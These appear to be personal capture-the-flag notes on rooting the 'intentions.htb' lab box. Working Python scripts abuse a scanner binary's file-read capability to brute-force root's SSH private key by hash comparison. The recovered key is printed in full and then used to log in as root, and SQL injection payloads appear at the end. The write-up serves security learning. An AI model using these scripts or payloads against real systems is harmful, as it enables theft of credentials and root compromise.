- the find command reveals nothing
- on checking steve's home directory we find a script
- on reading the script we see it calls /opt/scanner/scanner
- it is a binary executable
- couldn't find much with strace
- strings doesn't work
- stat shows no setuid existing
- **NEW COMMAND** : 
```bash
getcap /opt/scanner/scanner

---OUTPUT---
/opt/scanner/scanner cap_dac_read_search=ep
```
- And since it's owned by root, this binary can basically read anything as root
- maybe can read ssh key?
- We also do:
```bash
/opt/scanner/scanner

---OUTPUT---
The copyright_scanner application provides the capability to evaluate a single file or directory of files against a known blacklist and return matches.
  -c string **
     Path to image file to check. Cannot be combined with -d
  -d string
     Path to image directory to check. Cannot be combined with -c
  -h string **
     Path to colon separated hash file. Not compatible with -p
  -l int
     Maximum bytes of files being checked to hash. Files smaller than this value will be fully hashed. Smaller values are much faster but prone to false positives. (default 500)
  -p [Debug] Print calculated file hash. Only compatible with -c
  -s string **
     Specific hash to check against. Not compatible with -h
```
- To test we try to execute this scanner. 
- First we get md5 sum of first entry which is root in /etc/passwd/
```bash
cat /etc/passwd | head -1
echo -n r md5sum

---OUTPUT---
4b43b0aee35624cd95b910189b3dc231
```
- Then we check the hash with the scanner
```bash
/opt/scanner/scanner -c /etc/passwd -l 1 -s 4b43b0aee35624cd95b910189b3dc231
/opt/scanner/scanner -c /etc/passwd -l 1 -s 4b43b0aee35624cd95b910189b3dc231

---OUTPUT---
[+] 4b43b0aee35624cd95b910189b3dc231 matches /etc/passwd
(nothing for wrong input)
```
- Say we found md5sum of p then it would return nothing
- The we can do the same for ro, roo, root
- and we can use this scanner to match it
- so we need to make a script that can do this for us
```python
import subprocess
import hashlib
import string

charset = string.ascii_letters + string.digits + "-+/=\n" #base64 character set 

def brute(file,guess):
        hash = hashlib.md5(guess.encode()).hexdigest()
        result = subprocess.run(['/opt/scanner/scanner','-c', file, '-l', str(len(guess)), '-s', hash], stdout=subprocess.PIPE)
        if len(result.stdout) >0:
                return True
        return False

LOOP = True
guess = "-----BEGIN OPENSSH PRIVATE KEY-----"
print(guess,end="")
while LOOP:
        for c in charset:
                if brute("/root/.ssh/id_rsa", guess + c):
                        guess += c
                        print(c, end="", flush=True)
                        break
                if c == "\n":
                        LOOP = False

#print(len(result.stdout))

#print(result.stdout)
```
- We can test each section dynamically in target to see if it works.
- first we try brute and check if it is working
```bash
python3
import subprocess
import hashlib
import string
def brute(file,guess):
        hash = hashlib.md5(guess.encode()).hexdigest()
        result = subprocess.run(['/opt/scanner/scanner','-c', file, '-l', str(len(guess)), '-s', hash], stdout=subprocess.PIPE)
        if len(result.stdout) >0:
                return True
        return False

---TEST---
brute("/etc/passwd","root")    # We know this is true as it is the first user but we can check with cat /etc/passwd | head -1
> True
brute("/etc/passwd","greg")
> False
brute ("/root/.ssh/id_rsa","--") # key stats with ----BEGIN..---
> True
```
- brute function :
- it get's te md5 value of `guess` and compares it with the md5 hash of the file it reads and compares. 
- If `guess` is `ro` then it checks the first 2 characters of the file, hashes it, and compares it with the hash of `guess`, i.e the hash of `ro`. If it matches, it returns as True, if not, it returns as False.
- When checking the code, we would see that it returns something when true, but nothing when false, so we created the loop to check that if the output is >0 i.e there is some output, it is True, else it is False.
- The final LOOP explanation:
```bash
LOOP = True
guess = "-----BEGIN OPENSSH PRIVATE KEY-----"
print(guess,end="")
while LOOP:
        for c in charset:
                if brute("/root/.ssh/id_rsa", guess + c):
                        guess += c
                        print(c, end="", flush=True)
                        break
                if c == "\n":
                        LOOP = False
```
- We set LOOP as True
- guess is `-----BEGIN OPENSSH PRIVATE KEY-----` as that is how SSH key's start.
- While the LOOP is set to true, for every character c is our charset, we will call the brute function which compares the:
- md5 hash of the character's in `guesss` + the base64 character c in our charset with 
- the md5 hash of the character it reads in the file we state
				charset is basically all base64 characters as that is what's present in SSH keys
- If `guess`+c returns False, it will move on to the next character until brute returns True
- If `guess`+c returns False, and c is \n, which is the last character in our charset, then there was no match, and the loop breaks. Letting us know that program failed.
- If `guess`+c returns true, c is appended to `guess`
- This goes on until all the characters in the file are read and matched, printing the output
- Exploit this python script in target:
```bash
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```
- Save it on our local machine, assign privileges and ssh into target as root
```bash
vi root > copy key
chmod 0600 root
ssh -i root root@intentions.htb
```
- We gain root access!

## Better script from walkthrough
- script
```bash
import string
import hashlib
import subprocess

base = ""
hasResult = True
hashMap = {}
readFile = "/root/.ssh/id_rsa"

def checkMatch():
	global base
	global hashMap
	result = subprocess.Popen(["/opt/scanner/scanner","-c",readFile,"-h","./hash.log","-l",str(len(base) + 1)], stdout=subprocess.PIPE)
	for line in result.stdout:
		#print(line)
		line = str(line)
		if "[+]" in line:
			check = line.split(" ")
			if len(check) == 4:
				if check[1] in hashMap:
					base = hashMap[check[1]]
					return True
	return False

def writeFile(base):
	f = open("hash.log", "w")
	hashmap = {}
	for character in string.printable:
		check = base + character
		checkHash = hashlib.md5(check.encode())
		md5 = checkHash.hexdigest()
		hashMap[md5] = check
		f.write(md5 + ":" + md5)
		f.write("\n")
	f.close()
	
while hasResult:
	writeFile(base)
	hasResult = checkMatch()
	
print("Found")
print(base)
print("Done")
```
- Bit more complex but better.
- the checkmatch function passes the command (-h is path to a colon seperated hash file which we use from the next function)
- for each line (result.stdout is taken as a whole), if there exists a [+], the line is converted to a string (since its in bytes)
- then it starts another loop if length of check is 4 then if its true, it checks if the base already exists in hashmap (if check{1] is there in hashmap) 
- if we see the output earlier for /opt/scanners/scanners it basically divides the putput into 4 parts and the 4th part holds the hash value hence it's checking for 4
- The write function basically goes through all ascii characters and for each character it adds the base+ this character to check
- Then check is encoded and converted to an md5 hash object
- This is then converted to string readable format with hexdigest.
- md5 value and the value of check string is added to hashMap
- hash.log is written into like `hash`:`hash` for the right format i guess
- and while hasResult is true, 
- writeFile(base): This function is responsible for writing to a file (specifically hash.log). It generates all possible MD5 hashes for combinations of the base string and every character in string.printable.
- It hashes these combinations and writes them to the hash.log file.
- Essentially, this function is preparing the hash data for the checkMatch() function to process.
- After writing the hashes to hash.log, the code calls checkMatch().
- checkMatch() processes the output of the scanner and tries to match the hashes it has generated against the expected pattern.
- If checkMatch() finds a match, it updates the base string (which is being guessed), and the loop continues with the updated base.
- If no match is found, checkMatch() will return False, and the loop will terminate.
- The loop is trying to "brute force" or "guess" the correct value of base by generating possible hashes for it and comparing them to the output of the scanner.
- Each time a guess is correct (i.e., when checkMatch() returns True), the program updates base and tries again with a longer guess.
- This continues until the correct string is fully guessed, and the loop finishes when no more valid guesses can be made (i.e., checkMatch() returns False).


## Glitches
**Due to sqlmap running when refreshing the page**
- In profile section I notice when trying to do ' OR 1=1-- - the spaces get removed
- Using # as a space i tried passing the command and on refreshing the page I see some extra SQL code. Everytime I save data it keeps changing:
```bash
'#OR#1=1--#-'

---OUTPUT---
"/**/or/**/1=1--/**/-")OR4321=(SELECTCOUNT(*)FROMINFORMATION_SCHEMA.COLUMNSA,INFORMATION_SCHEMA.COLUMNSB,INFORMATION_SCHEMA.COLUMNSCWHERE0XOR1)AND("VTPz"="VTPz
--------
"/**/or/**/1=1--/**/-);SELECT/**/COUNT(*)/**/FROM/**/GENERATE_SERIES(1,5000000)--
```
- GENERATE_SERIES maybe a database?
- INFORMATION_SCHEMA
- **This happened just once, not working now**
